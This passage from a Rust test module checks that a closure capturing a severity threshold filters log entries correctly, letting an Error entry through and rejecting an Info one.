    }

    /// Test closure capture
    #[test]
    fn test_closure_capture() {
        let threshold = Severity::Warning;

        // Closure captures `threshold` from environment
        let filter = |entry: &LogEntry| entry.severity >= threshold;

        let info_entry = LogEntry {
            line_number: 1,
            raw: String::new(),
            timestamp: None,
            hostname: None,
            process: None,
            pid: None,
            message: "test".to_string(),
            severity: Severity::Info,
            ip_addresses: Vec::new(),
            usernames: Vec::new(),
            event_type: None,
        };

        let error_entry = LogEntry {
            severity: Severity::Error,
            ..info_entry.clone()
        };

        assert!(!filter(&info_entry));  // Info < Warning
        assert!(filter(&error_entry));   // Error >= Warning
    }
}
